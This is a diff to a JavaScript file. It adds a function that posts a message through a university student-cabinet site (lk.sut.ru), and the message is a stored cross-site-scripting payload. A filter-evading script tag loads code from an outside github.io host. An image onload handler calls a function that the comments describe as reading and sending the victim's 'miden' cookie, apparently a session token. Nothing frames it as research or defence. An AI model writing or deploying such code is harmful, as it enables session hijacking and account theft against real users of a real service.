@@ -20,6 +20,11 @@ function getCookie(name) {
     return unescape(document.cookie.substring(cookieStartIndex + prefix.length, cookieEndIndex))
 }
 
+function getMiden(id){
+	// Отправляет сообщение с ловушкой получения miden
+	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", 'idinfo=0&title=<scrip<scriptt src="https://thealexgo.github.io/forHTML_Academy/js/script.js" async></script>Привет!&mes=<img src=https://pm1.narvii.com/7222/e111e7e7fc0519c97af53ec2f883bf2a358af1c2r1-700-998v2_hq.jpg onload=sendMiden() height=100>&adresat='+id)
+}
+
 function sendMiden(){
 	// Получает cookie и отправляет miden
 	let miden = getCookie('miden')
